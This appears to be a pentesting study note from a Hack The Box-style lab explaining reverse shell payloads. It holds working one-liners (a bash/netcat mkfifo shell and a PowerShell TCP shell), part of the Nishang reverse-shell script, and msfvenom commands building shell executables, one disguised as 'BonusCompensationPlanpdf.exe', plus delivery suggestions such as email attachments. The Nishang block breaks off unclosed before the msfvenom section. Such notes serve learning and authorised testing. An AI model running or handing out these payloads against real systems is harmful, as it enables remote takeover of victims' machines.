# 🤹‍♂️ Payloads

It's good to understand what is a payload and understanding what the payload does rather than just pasting it

**Netcat/Bash Reverse Shell One-liner**&#x20;

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

So here we delete tmp/f if it exists, then we Make a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) called /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

`2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe

**Powershell One-liner**

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

We first execute `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`)

Then we set the `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed

Then we set `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications.

Then we Create a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

The one-liner we just examined can also be executed in the form of a PowerShell script (`.ps1`)

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.

## Crafting Payloads with MSFvenom

To list all of the msfvenom payloads ->

```
ElFelixi0@htb[/htb]$ msfvenom -l payloads
```

#### Staged vs. Stageless Payloads

When running a staged exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere.

#### Building stageless payload&#x20;

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

`-f elf` is to specify the format the file will be in

To execute our stageless payload there are numerous ways to deliver the payload to target ->

* Email message with the file attached.
* Download link on a website.
* Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
* Via flash drive as part of an onsite penetration test.

Then we would set up a listener ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 443
```

And wait for our target to trigger the file we juste sent ->

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

And when the file is executed&#x20;

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
```

#### Building a simple Stageless Payload for a Windows system

```shell-session
ElFelixi0@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`)

Let's say our target downloaded the file ->

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
